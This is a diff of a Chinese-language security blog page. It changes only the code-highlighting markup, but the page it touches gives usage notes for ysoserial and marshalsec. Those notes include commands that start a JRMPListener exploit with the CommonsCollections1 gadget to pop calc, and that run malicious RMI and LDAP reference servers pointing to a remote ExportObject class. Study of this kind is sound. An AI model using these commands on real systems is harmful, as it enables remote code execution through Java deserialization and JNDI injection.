@@ -580,6 +580,21 @@
         
  <!-- prismjs 代码高亮 -->
  
+    
+    <link href="/js/prism/prism-line-numbers.css" rel="stylesheet">
+    
+        <link href="/js/prism/prism-coy.min.css" rel="stylesheet">
+    
+
+    <style>
+        pre[class*="language-"] {
+            overflow-y: hidden;
+        }
+        .line-numbers .line-numbers-rows {
+            border: none;
+        }
+    </style>
+  
 
 
 <div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
@@ -626,13 +641,13 @@
 <p>需要java1.7以上</p>
 <p>也可以直接下载jar：<a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar</a></p>
 <h1 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h1><p>运行主类函数，如JRMPListener</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener 38471</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial-0.0.6-SNAPSHOT-all.jar JRMPListener <span class="token number">38471</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>运行exploit类。开启交互式服务，这里利用exploit.JRMPListener开启1099端口，并用CC1弹计算器。命令行的-cp参数表示指定classpath</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="string">&#x27;calc&#x27;</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener <span class="token number">1099</span> CommonsCollections1 <span class="token string">'calc'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>查看ysoserial的payload:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> ysoserial.jar<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 
 
@@ -640,12 +655,12 @@
 
 <h1 id="marshalsec"><a href="#marshalsec" class="headerlink" title="marshalsec"></a>marshalsec</h1><p>可以直接下jar版，也可<a target="_blank" rel="noopener" href="https://gitee.com/mirrors/marshalsec%E4%B8%8B%E8%BD%BD%E5%90%8E%E8%87%AA%E8%A1%8C%E7%BC%96%E8%AF%91">https://gitee.com/mirrors/marshalsec下载后自行编译</a></p>
 <p>开启RMI服务：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/<span class="comment">#ExportObject 1099</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/<span class="token comment">#ExportObject 1099</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>利用jndi.RMIReferServer开启RMI服务，绑定的远程对象在<a target="_blank" rel="noopener" href="http://127.0.0.1/css/#ExportObject%EF%BC%8C%E7%AB%AF%E5%8F%A31099">http://127.0.0.1/css/#ExportObject，端口1099</a></p>
 <p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226184741732.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226184741732.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
 <p>开启LDAP服务：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/<span class="comment">#ExportObject 1389</span></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-cp</span> target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/<span class="token comment">#ExportObject 1389</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>暂时只需要那么多</p>
 
